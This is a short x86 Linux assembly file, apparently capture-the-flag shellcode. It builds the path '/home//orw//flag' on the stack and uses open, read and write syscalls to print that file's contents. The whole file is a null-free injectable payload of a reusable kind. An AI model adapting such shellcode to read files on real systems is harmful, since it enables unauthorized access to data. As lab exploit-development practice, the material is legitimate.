section .text
	global _start

_start:
        xor edx, edx
        xor ecx, ecx
        xor eax, eax
        push eax
        push 0x67616c66
        push 0x2f2f7772
        push 0x6f2f2f65
        push 0x6d6f682f
        mov ebx, esp
        mov al, 0x5
        int 0x80

        xor edx, edx
        mov dl, 0x32
	add esp, 0x32
        mov ecx, esp
        xor ebx, ebx
        mov bl, al
        xor eax, eax
        mov al, 0x3
        int 0x80

        xor edx, edx
        mov dl, 0x32
        mov ecx, esp
        xor ebx, ebx
        mov bl, 0x1
        xor eax, eax
        mov al, 0x4
        int 0x80

